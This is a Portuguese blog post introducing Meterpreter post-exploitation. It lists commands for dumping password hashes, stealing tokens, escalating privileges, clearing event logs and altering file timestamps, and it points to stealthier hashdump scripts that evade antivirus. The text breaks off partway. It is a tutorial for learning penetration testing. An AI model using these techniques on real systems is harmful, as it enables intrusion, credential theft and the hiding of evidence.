---
layout: post
title: Pós-Conexão - Conhecendo Meterpreter
date: '2018-01-13T12:35:00.003-08:00'
author: Israel Helton Wernik
tags: 
modified_time: '2018-01-13T12:37:07.197-08:00'
thumbnail: https://lh4.googleusercontent.com/dpKHlSzxd4an1Z7GPwsIHi8D1Fc2JtTHLJMh3_JMkQ6weOgcNWwhl0WBdds-I6VoHuUOGqUprB_HDulacw3CEGSBG4Lvof83HsmnrFTwPCqVASuTaIL7_JdMeFbxQEyIv1yeq7JD=s72-c
blogger_id: tag:blogger.com,1999:blog-5213248075369348047.post-6862248071959246739
blogger_orig_url: https://cibersegurancawernik.blogspot.com/2018/01/pos-conexao-conhecendo-meterpreter-post.html
---

<div dir="ltr" style="line-height: 1.38; margin-bottom: 3pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 26pt; vertical-align: baseline; white-space: pre-wrap;"><img height="475" src="https://lh4.googleusercontent.com/dpKHlSzxd4an1Z7GPwsIHi8D1Fc2JtTHLJMh3_JMkQ6weOgcNWwhl0WBdds-I6VoHuUOGqUprB_HDulacw3CEGSBG4Lvof83HsmnrFTwPCqVASuTaIL7_JdMeFbxQEyIv1yeq7JD" style="border: none; transform: rotate(0rad);" width="487" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 3pt; margin-top: 0pt;"><br /></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Post Exploitation - Como o termo sugere, a &nbsp;exploração posterior basicamente significa as fases de operação uma vez que o sistema da vítima foi comprometido pelo atacante. Seja atravéz de engenharia social, Backdoors, pelo servidor, em todos os outros artigos vimos como conseguir acesso ao meterpreter </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O valor do sistema comprometido é determinado pelo valor dos dados reais armazenados nele e como um invasor pode usá-lo para fins maliciosos. O conceito de pós-exploração aumentou a partir deste fato apenas sobre como você pode usar as informações do sistema comprometido da vítima. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Esta fase realmente trata de coletar informações confidenciais, documentá-la e ter uma idéia das configurações, interfaces de rede e outros canais de comunicação. Estes podem ser usados para manter o acesso persistente ao sistema de acordo com as necessidades do invasor.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"></div><a name='more'></a><br /><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><img height="194" src="https://lh4.googleusercontent.com/A44e-OefVNbv9oXBd_lGWsaeUQ6S4Fe1uhBq6HigfsVMy57REC2cxmKvBEV-uEvHTa00JFnjCcbqGdkSPgviosqEcE5Zaa5OH3pf9AXL1Rursc_4e8TOnx24qteKMzTboxmyP4-_" style="border: none; transform: rotate(0rad);" width="418" /></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos ver como manter acesso ao alvo mesmo depois que a vítima reiniciar seu computador, veremos como baixar arquivos, enviar arquivos, abrir a webcam, iniciar um keylogger.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Também veremos como utilizar o computador da vítima para invadir outros computadores na mesma rede.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Por exemplo, se você não consegue ter acesso ao seu alvo, mas pode ter acesso a um computador que pode ter acesso a rede de seu alvo.</span></div><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><span style="font-family: &quot;arial&quot;; font-size: 20pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Básico do Meterpreter </span></h1><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Uma vez que o Meterpreter fornece um ambiente totalmente novo, abordaremos alguns dos comandos básicos do Meterpreter para que você comece e ajude a familiarizá-lo com essa ferramenta mais poderosa.</span></div><br /><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Core Commands</span></h2><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt; text-align: justify;"><span style="background-color: white; color: #383838; font-family: &quot;arial&quot;; font-size: 13pt; vertical-align: baseline; white-space: pre-wrap;">At its most basic use, meterpreter is a Linux terminal on the victim's computer. As such, many of our basic Linux commands can be used on the meterpreter even if it's on a Windows or other operating system.</span></div><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt; text-align: justify;"><span style="background-color: white; color: #383838; font-family: &quot;arial&quot;; font-size: 13pt; vertical-align: baseline; white-space: pre-wrap;">Here are some of the core commands we can use on the meterpreter.</span></div><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">?</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - help menu</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">background</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - moves the current session to the background</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">bgkill</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - kills a background meterpreter script</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">bglist</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - provides a list of all running background scripts</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">bgrun</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - runs a script as a background thread</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">channel</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - displays active channels</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">close</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - closes a channel</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">exit</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - terminates a meterpreter session</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">help</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - help menu</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">interact</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - interacts with a channel</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">irb</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - go into Ruby scripting mode</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">migrate</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - moves the active process to a designated PID</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">quit</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - terminates the meterpreter session</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">read</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - reads the data from a channel</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">run</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - executes the meterpreter script designated after it</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">use</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - loads a meterpreter extension</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">write</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - writes data to a channel</span></div></li></ul><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Networking Commands</span></h2><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">ipconfig</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - displays network interfaces with key information including IP address, etc.</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">portfwd</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - forwards a port on the victim system to a remote service</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">route</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - view or modify the victim routing table</span></div></li></ul><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">System Commands</span></h2><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">clearav</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - clears the event logs on the victim's computer</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">drop_token</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - drops a stolen token</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">execute</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - executes a command</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getpid</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - gets the current process ID (PID)</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getprivs</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - gets as many privileges as possible</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getuid</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - get the user that the server is running as</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">kill</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - terminate the process designated by the PID</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">ps</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - list running processes</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">reboot</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - reboots the victim computer</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">reg</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - interact with the victim's registry</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">rev2self</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - calls RevertToSelf() on the victim machine</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">shell</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - opens a command shell on the victim machine</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">shutdown</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - shuts down the victim's computer</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">steal_token</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - attempts to steal the token of a specified (PID) process</span></div></li><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">sysinfo</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - gets the details about the victim computer such as OS and name</span></div></li></ul><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Privilege Escalation Commands</span></h2><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getsystem</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - uses 15 built-in methods to gain sysadmin privileges</span></div></li></ul><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Password Dump Commands</span></h2><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">hashdump</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - grabs the hashes in the password (SAM) file</span></div></li></ul><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt; text-align: justify;"><span style="background-color: white; color: #383838; font-family: &quot;arial&quot;; font-size: 13pt; vertical-align: baseline; white-space: pre-wrap;">Note that hashdump will often trip AV software, but there are now two scripts that are more stealthy, "run hashdump" and "run smart_hashdump". Look for more on those on my upcoming meterpreter script cheat sheet.</span></div><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Timestomp Commands</span></h2><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="background-color: white; color: #383838; font-family: Arial; font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; margin-left: 26pt; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.8; margin-bottom: 20pt; margin-top: 0pt;"><span style="color: black; font-size: 13pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">timestomp</span><span style="font-size: 13pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - manipulates the modify, access, and create attributes of a file</span></div></li></ul><h3 style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Vamos Estudar um pouco de alguns desses comandos</span></h3><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; Help</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - mostra os comandos</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; backgroun</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">d - enviará a sessão Meterpreter atual para o plano de fundo e retornará ao prompt msf. Para voltar para a sua sessão do Meterpreter, basta interagir novamente com ele.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; sessions -l </span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">- lista todas as sessões ativas</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; 